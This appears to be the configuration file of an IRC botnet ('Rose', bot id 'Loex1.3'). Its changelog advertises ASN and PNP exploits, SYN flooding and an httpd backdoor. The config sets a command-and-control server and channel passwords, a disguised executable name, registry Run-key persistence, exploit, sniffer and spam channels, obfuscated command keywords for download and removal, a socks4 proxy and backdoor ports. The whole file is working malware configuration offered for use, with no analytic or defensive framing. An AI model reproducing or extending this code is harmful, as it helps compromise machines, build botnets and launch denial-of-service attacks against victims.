/* 
Rose 1.0:
- added asn
- fixed asn ftpd(tested, works)
- added SYN
- custom commands

Rose 1.1:
- added PNP
- added httpd backdoor

*/


// bot configuration

char version[] = "x86";
char botid[] = "Loex1.3";

char filename[] = "ntservice.exe";
char valuename[] = "Intec Service Drivers";


BOOL rndfilename = FALSE;
BOOL regrun = TRUE;
char prefix = '.';
int cryptkey = 0;

const int maxaliases = 16;
const int maxlogins = 2;

int maxrand = 9;
char nickconst[] = "[EX]-";
BOOL nickprefix = TRUE;
int nicktype = CONSTNICK;

//host auth
char *authost[] = {"*@MasterExploit.com", "\0"};

//cftp
char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "21";			// cftp port ".lsaport 6969"
char lsuser[] = "evil";
char lspass[] = "bingo2";

// server configuration
char server[] = "nights.co.il"; // server
char server2[] = ""; // backup server (dont use semi-gay. bleah)

// ports
int port = 6667; // server port
int port2 = 6667; // backup server port (dont use. gay. bleah)
int tftpport = 69;

char serverpass[] = ""; // server password

int socks4port = 7561; // socks4 server port.

// channel configuration
char password[] = "jx4fert9";
char channel[] = "#bots";
char chanpass[] = "";
char channel2[] = "";
char chanpass2[] = "";
BOOL topiccmd = TRUE;
char psniffchan[] = "#sploit";
char exploitchan[] = "#sploit";
char spamchan[]	= "#sploit";
char infochan[] = "#sploit"; 

//reg keys
char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";


//custom commands
const char slogin[]="l0g1n";
const char sremove[]="p1ss0ff";
const char supdate[]="upd3x";
const char sdownload[]="d0wnl04d";
const char sadvscan[]="scan";

//httpd backdoor functions
int httpport = 2006;
unsigned short bport = 4460;		// bindport for exploits